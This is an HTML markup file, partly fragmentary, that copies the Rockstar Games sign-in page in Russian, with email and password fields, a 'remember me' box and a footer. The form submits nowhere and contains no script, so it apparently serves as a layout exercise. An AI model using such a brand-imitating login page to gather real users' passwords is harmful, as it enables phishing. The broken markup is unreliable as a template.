<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In - Rockstar Games</title>

</head>

                        </a>

                    </div>

                    <div class="sign-in">

                        <h1 class="sign-in-input__text">Войти</h1>

                        <form class="sign-in__form">
                            <fieldset class="sign-in-form__ligament sign-in-input__text">
                            <span class="sign-in-input__container">
                                <input class="sign-in-input__element" id="email" type="email" name="email" value placeholder=" ">
                                <label class="sign-in-input__label" for="email">
                                    <span>Электронная почта</span>
                                </label>
                            </span>

                            </fieldset>

                            <fieldset class="sign-in-form__ligament sign-in-input__text">

                            <span class="sign-in-input__container">
                                <input class="sign-in-input__element" id="password" type="password" name="password" value placeholder=" ">
                                <label class="sign-in-input__label" for="password">
                                    <span>Пароль</span>
                                </label>

                                <button class="sign-in-show__password">

                                    </path></svg>
                                </button>
                            </span>

                                <div class="sign-in__keep-me">
                                <span class="sign-in-keep-me__inside">
                                    <input class="sign-in__keep-me__button" id="box" type="checkbox" value="Sign In">
                                    <label class="sign-in__keep-me__label" for="box">
                                        <span>Запомнить меня</span>
                                    </label>
                                </span>
                                </div>

                            </fieldset>
                            <div class="sign-in__bottom">

                                <a class="sign-in__forgot__password sign-in-input__text" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRH6FqskyB2WDxj3bpKjRLOAhIkTzrpKa64aBji-nodvA&s">
                                    Забыли пароль?</a>

                                <button class="sign-in-button sign-in-input__text">Войти</button>
                            </div>
                        </form>

                    </div>

                        <fieldset class="sign-in__social__fieldset">

                                <a class="sign-in__social-icons__element" href="">

                                <a class="sign-in__social-icons__element" href="">

                                    </svg>
                                </a>

                            </div>
                        </fieldset>
                    </div>

                    <div class="sign-in__create__account sign-in-input__text">
                        <p>У вас еще нет учетной записи Rockstar Games?
                            <a href="">Создать новую учетную запись</a>
                        </p>
                    </div>
                </div>
            </div>
        </main>

        <footer class="footer">
            <div class="footer-list__container sign-in-input__text">

                <ul class="footer-list">

                    <li class="footer-list__item footer-list__item--copyright">
                        ©
                        2026 Rockstar Games
                    </li>


                    <li class="footer-list__item">
                        <button class="footer-list__btn">
                            Политика конфиденциальности
                        </button>
                    </li>
                    <li class="footer-list__item">
                        <button class="footer-list__btn">
                            Условия обслуживания
                        </button>
                    </li>
                    <li class="footer-list__item">
                        <button class="footer-list__btn">
